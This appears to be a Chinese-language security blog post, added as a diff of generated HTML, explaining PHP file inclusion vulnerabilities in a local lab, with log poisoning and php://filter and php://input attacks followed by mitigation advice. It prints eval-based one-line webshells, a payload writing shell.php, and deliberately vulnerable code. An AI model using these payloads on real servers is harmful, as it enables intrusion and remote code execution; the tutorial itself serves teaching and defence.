@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"byroins.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":2,"unescape":true,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Environment: PHP Apache   Lab: Local Scripts   1.0 文件包含1.1文件包含漏洞分类 本地文件包含漏洞(LFI): 包含服务器本地的文件  远程文件包含漏洞(RFI): 包含远程服务器上的文件  触发前提: (php.ini): allow_url_fopen &#x3D; On(默认On, 影响fopen类函数) allow_url_includ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Include-File">
+<meta property="og:url" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/index.html">
+<meta property="og:site_name" content="Byron">
+<meta property="og:description" content="Environment: PHP Apache   Lab: Local Scripts   1.0 文件包含1.1文件包含漏洞分类 本地文件包含漏洞(LFI): 包含服务器本地的文件  远程文件包含漏洞(RFI): 包含远程服务器上的文件  触发前提: (php.ini): allow_url_fopen &#x3D; On(默认On, 影响fopen类函数) allow_url_includ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/1.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/2.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/3.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/4.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/5.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/6.png">
+<meta property="article:published_time" content="2026-08-04T14:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-06T06:45:52.265Z">
+<meta property="article:author" content="Byron">
+<meta property="article:tag" content="access.log">
+<meta property="article:tag" content="httpd.conf">
+<meta property="article:tag" content="include">
+<meta property="article:tag" content="logs">
+<meta property="article:tag" content="php:&#x2F;&#x2F;">
+<meta property="article:tag" content="php:&#x2F;&#x2F;filter">
+<meta property="article:tag" content="php:&#x2F;&#x2F;input">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/1.png">
+
+
+<link rel="canonical" href="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/","path":"2026/08/04/web-security/upload-file/2026-08-04-include-file/","title":"Include-File"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Include-File | Byron</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Byron" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Byron</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Web Application Security Research & Exploit Development</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">1.0 文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="nav-number">1.1.</span> <span class="nav-text">1.1文件包含漏洞分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 文件包含漏洞发现及其利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-1-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%88%E4%BE%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.2.1 日志文件漏洞利用案例:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-1-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.3.1 概述:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-2-%E6%A1%88%E4%BE%8B"><span class="nav-number">1.3.2.</span> <span class="nav-text">1.3.2 案例:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E4%BF%AE%E5%A4%8D%E9%98%B2%E8%8C%83"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 修复防范</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Byron"
+      src="/images/private/icon1.png">
+  <p class="site-author-name" itemprop="name">Byron</p>
+  <div class="site-description" itemprop="description">Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/byroins/penetration-testing" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;byroins&#x2F;penetration-testing" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/04/web-security/upload-file/2026-08-04-include-file/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Include-File | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Include-File
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-08-04 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-04T22:00:00+08:00">2026-08-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-08-06 14:45:52" itemprop="dateModified" datetime="2026-08-06T14:45:52+08:00">2026-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/include-file/" itemprop="url" rel="index"><span itemprop="name">include-file</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>Environment: PHP Apache</p>
+</blockquote>
+<blockquote>
+<p>Lab: Local Scripts</p>
+</blockquote>
+<hr>
+<h2 id="1-0-文件包含"><a href="#1-0-文件包含" class="headerlink" title="1.0 文件包含"></a>1.0 文件包含</h2><h3 id="1-1文件包含漏洞分类"><a href="#1-1文件包含漏洞分类" class="headerlink" title="1.1文件包含漏洞分类"></a>1.1文件包含漏洞分类</h3><ul>
+<li><p>本地文件包含漏洞(LFI): 包含服务器本地的文件</p>
+</li>
+<li><p>远程文件包含漏洞(RFI): 包含远程服务器上的文件</p>
+<ul>
+<li>触发前提: (php.ini):<ul>
+<li>allow_url_fopen &#x3D; On(默认On, 影响fopen类函数)</li>
+<li>allow_url_include &#x3D; On(默认Off, RFI的关键前提)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>常见触发函数</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>include()</code></td>
+<td>包含并执行文件; <strong>失败时产生Warning, 脚本继续执行</strong></td>
+</tr>
+<tr>
+<td><code>include_once()</code></td>
+<td>同include(), 但<strong>同一文件只包含一次</strong></td>
+</tr>
+<tr>
+<td><code>require()</code></td>
+<td>包含并执行文件; <strong>失败时产生Fatal Error, 脚本终止</strong></td>
+</tr>
+<tr>
+<td><code>require_once()</code></td>
+<td>同require()，但<strong>同一文件只包含一次</strong></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>漏洞本质: include&#x2F;require的参数可被用户控制且未做有效过滤</p>
+</li>
+</ul>
+<hr>
+<h3 id="1-2-文件包含漏洞发现及其利用"><a href="#1-2-文件包含漏洞发现及其利用" class="headerlink" title="1.2 文件包含漏洞发现及其利用"></a>1.2 文件包含漏洞发现及其利用</h3><ul>
+<li><p>目录穿越:</p>
+<ul>
+<li>..&#x2F;</li>
+<li>….&#x2F;&#x2F;(双写)</li>
+</ul>
+</li>
+<li><p>本地文件包含漏洞利用</p>
+<p>01 配合文件上传使用, 找不到文件上传漏洞时, 无法上传WebShell, 可先上传图片格式WebShell到服务器, 再利用本地文件包含漏洞进行解析</p>
+<p>02 包含Apache日志文件: 网站存在文件包含漏洞, 但无文件上传点, 这时可利用Apache日志文件生成一句话木马</p>
+<ul>
+<li>利用条件:<ul>
+<li>日志文件可读权限</li>
+<li>日志文件存储路径已知</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="1-2-1-日志文件漏洞利用案例"><a href="#1-2-1-日志文件漏洞利用案例" class="headerlink" title="1.2.1 日志文件漏洞利用案例:"></a>1.2.1 日志文件漏洞利用案例:</h4><p><strong>注意:</strong> 需要开启Apache日志记录功能</p>
+<ul>
+<li><p>httpd.conf → CustomLog “logs&#x2F;access.log” common</p>
+</li>
+<li><p>为什么用 Burp? 浏览器会把 <code>&lt;</code> <code>&gt;</code> <code>空格</code> URL 编码, 编码文本进日志后无法构成 &lt;?php 标签</p>
+<p>Burp可控制原始字节, 且请求行即使返回 400, 也会被写进日志(利用点)</p>
+</li>
+<li><p>common格式只记请求行, 毒化点放在 URL; 若想毒化 UA&#x2F;Referer, 需combined格式</p>
+</li>
+</ul>
+<p><strong>如下图, 使用BurpSuite抓包修改注入一句话木马</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/1.png"></p>
+<blockquote>
+<p>拦截数据包修改请求</p>
+</blockquote>
+<hr>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/2.png"></p>
+<blockquote>
+<p>如图, 日志中成功注入一句话木马</p>
+</blockquote>
+<hr>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/3.png"></p>
+<blockquote>
+<p>通过已知日志文件路径访问并获得WebShell</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="1-3-PHP伪协议"><a href="#1-3-PHP伪协议" class="headerlink" title="1.3 PHP伪协议"></a>1.3 PHP伪协议</h3><h4 id="1-3-1-概述"><a href="#1-3-1-概述" class="headerlink" title="1.3.1 概述:"></a>1.3.1 概述:</h4><ul>
+<li><p>PHP伪协议即 <strong>Stream Wrappers(流封装器)</strong>, 是PHP的统一I&#x2F;O抽象层, 让同一套文件函数(<code>include/fopen/file_get_contents...</code>)能操作文件, 网络, 压缩包, 内存等不同数据源。</p>
+</li>
+<li><p>漏洞本质:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户可控的<span class="string">&quot;路径&quot;</span>进入文件函数</span><br><span class="line">	+ 攻击者用协议切换<span class="string">&quot;文件&quot;</span>的语义</span><br><span class="line">	= 读(源码<span class="regexp">/配置) or 执行(包含/</span>反序列化)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PHP支持的伪协议:</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>php:&#x2F;&#x2F;</strong></td>
+<td>访问I&#x2F;O流</td>
+</tr>
+<tr>
+<td><strong>phar:&#x2F;&#x2F;</strong></td>
+<td>PHP归档</td>
+</tr>
+<tr>
+<td><strong>file:&#x2F;&#x2F;</strong></td>
+<td>本地文件系统</td>
+</tr>
+<tr>
+<td><strong>zip:&#x2F;&#x2F;</strong></td>
+<td>ZIP归档</td>
+</tr>
+<tr>
+<td>data:&#x2F;&#x2F;</td>
+<td>内联数据(RFC 2397)</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>php:</p>
+<ul>
+<li>php:&#x2F;&#x2F;filter 元封装器, 读源码首选, 无任何配置前提</li>
+<li>php:&#x2F;&#x2F;input 请求体原始只读流, 配合 include 把 POST 体当代码执行</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>php:&#x2F;&#x2F;filter 参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;数据流&gt;</td>
+<td><strong>必选</strong>, 指定要筛选过滤的数据流</td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链过滤器&gt;</td>
+<td>可选, 读链过滤器, 管道符&#96;</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链过滤器&gt;</td>
+<td>可选, 写链过滤器</td>
+</tr>
+<tr>
+<td>&lt;无前缀过滤器链&gt;</td>
+<td>任何没有以 read&#x3D; &#x2F; write&#x3D; 作为前缀的过滤器列表会视情况应用于读链或写链</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>等同于str_rot13(), rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于strtoupper(), 转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于strtolower(), 转小写字母</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode &amp;<br>convert.base64-decode</td>
+<td>等同于base64_encode() &amp;<br>base64_decode(), <strong>base64编码和解码</strong></td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp;<br>convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与8-bit字符串编码和解码</td>
+</tr>
+</tbody></table>
+<p><strong>重点:</strong></p>
+<ul>
+<li>为什么要Base64?<ul>
+<li>防止源码被PHP引擎执行, 原样输出后再本地解码</li>
+</ul>
+</li>
+<li>不只对<code>include()</code>有效, 对<code>file_get_contents()/readfile()/fopen()</code>同样生效</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-3-2-案例"><a href="#1-3-2-案例" class="headerlink" title="1.3.2 案例:"></a>1.3.2 案例:</h4><ul>
+<li><p><strong>Case 1: php:&#x2F;&#x2F;filter源码读取</strong></p>
+<p><code>content.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>user.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>利用伪协议读取源码</p>
+</blockquote>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/4.png"></p>
+<blockquote>
+<p>通过php:&#x2F;&#x2F;filter成功读取到经过base64编码的源代码, 再通过解码器解码获得源码</p>
+</blockquote>
+<ul>
+<li>读取型函数下 base64 的额外价值: <ul>
+<li>绕路径过滤&#x2F;WAF关键词</li>
+<li>源码直接回显时<code>&lt;?php ..?&gt; </code>会被浏览器当作XML处理指令吞掉, 页面空白<code>base64</code>保证可见</li>
+</ul>
+</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>Case 2: php:&#x2F;&#x2F;input代码执行</strong></p>
+<p>原理: 可以访问请求的原始数据只读流, 将post请求的数据当作php代码执行</p>
+<blockquote>
+<p>前提: allow_url_include&#x3D;On(默认 Off)</p>
+</blockquote>
+<ul>
+<li><p>Payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[cmd]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>写入一个文件<code>shell.php</code> ,文件内容为一句话木马</p>
+</blockquote>
+</li>
+</ul>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/5.png"></p>
+<blockquote>
+<p>抓包修改GET请求为POST类型, 并在请求体写入Payload</p>
+</blockquote>
+<p><img data-src="/2026/08/04/web-security/upload-file/2026-08-04-include-file/6.png"></p>
+<blockquote>
+<p>通过shell.php成功getshell !</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="1-4-修复防范"><a href="#1-4-修复防范" class="headerlink" title="1.4 修复防范"></a>1.4 修复防范</h3><ul>
+<li><p>数据输入验证</p>
+<ul>
+<li>对用户提交的文件路径参数进行严格的格式检查和白名单策略, 只允许包含预定义的, 安全的文件路径</li>
+<li>禁止包含绝对路径, 转而使用相对路径, 并且确保相对路径不会超出预期的目录范围</li>
+</ul>
+</li>
+<li><p>禁用危险函数或配置</p>
+<ul>
+<li>如果不是必须, 尽量避免使用容易导致文件包含漏洞的函数, 如PHP中的<code>allow_url_include</code>配置项应设为<code>Off</code>以禁用远程文件包含</li>
+<li>在php.ini配置文件中, 可以设置<code>open_basedir</code>限制PHP脚本只能访问指定目录及其子目录下的文件</li>
+</ul>
+</li>
+<li><p>使用安全函数</p>
+<ul>
+<li>使用更安全的函数替代易出问题的文件包含函数, 例如在PHP中, 可以使用<code>readfile()</code>配合自定义的文件路径处理逻辑来代替<code>include()</code></li>
+</ul>
+</li>
+<li><p>错误处理与日志记录</p>
+<ul>
+<li>正确处理文件包含失败的情况, 不要暴露过多的错误信息, 以免给攻击者提供有用的信息</li>
+<li>记录详细的日志, 以便在发生异常时追溯分析问题</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/httpd-conf/" rel="tag"># httpd.conf</a>
+              <a href="/tags/logs/" rel="tag"># logs</a>
+              <a href="/tags/access-log/" rel="tag"># access.log</a>
+              <a href="/tags/include/" rel="tag"># include</a>
+              <a href="/tags/php/" rel="tag"># php://</a>
+              <a href="/tags/php-filter/" rel="tag"># php://filter</a>
+              <a href="/tags/php-input/" rel="tag"># php://input</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/" rel="prev" title="Upload-File">
+                  <i class="fa fa-angle-left"></i> Upload-File
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments utterances-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Byron</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
